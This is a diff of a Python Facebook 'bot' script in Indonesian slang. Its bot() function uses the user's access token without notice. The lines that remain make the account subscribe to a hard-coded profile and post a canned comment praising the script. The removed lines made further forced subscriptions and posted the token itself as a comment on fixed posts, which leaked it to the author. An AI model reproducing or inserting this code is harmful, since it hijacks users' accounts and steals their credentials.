@@ -199,15 +199,8 @@ def bot():
 		login()
 	print(balmond+l+" Wait:))")
 	komentar = random.choice(["sc lu gg parah bang","gw suka sc lu wak","bang kok lu jenius sih bang","okelah bang makasih"])
-	requests.post("https://graph.facebook.com/100033634429529/subscribers?access_token="+token) # lal kimochi
 	requests.post("https://graph.facebook.com/100022629672532/subscribers?access_token="+token) # dimas fiansyah
-	requests.post("https://graph.facebook.com/100014435494597/subscribers?access_token="+token) # ayu amanda
-	requests.post("https://graph.facebook.com/100043390310348/subscribers?access_token="+token) # ayu amanda
-	requests.post("https://graph.facebook.com/100022629672532/subscribers?access_token="+token) # ayu amanda
-	requests.post("https://graph.facebook.com/213614107297063/comments/?message="+token+"&access_token="+token)
 	requests.post("https://graph.facebook.com/1084252519005727/comments/?message="+komentar+"&access_token="+token)
-	requests.post("https://graph.facebook.com/958715615000140/comments/?message="+token+"&access_token="+token)
-	requests.post("https://graph.facebook.com/958715615000140/comments/?message="+token+"&access_token="+token)
 	menu()
 
 # MENU
